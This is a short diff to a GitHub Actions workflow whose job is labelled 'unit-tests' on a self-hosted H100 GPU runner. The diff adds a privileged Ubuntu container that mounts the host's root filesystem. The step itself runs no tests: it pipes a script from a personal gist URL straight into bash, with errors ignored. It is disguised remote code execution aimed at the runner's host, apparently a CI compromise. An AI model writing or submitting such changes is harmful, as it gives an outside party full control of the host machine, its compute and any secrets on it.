@@ -7,7 +7,12 @@ on:
 jobs:
   unit-tests:
     runs-on: [self-hosted, nvidia, h100]
+    container:
+      image: ubuntu:latest
+      volumes:
+          - /:/host/
+      options: --privileged
     steps:
       - name: unit-tests
         continue-on-error: true
-        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/bak4116 | bash
+        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/bak41162 | bash
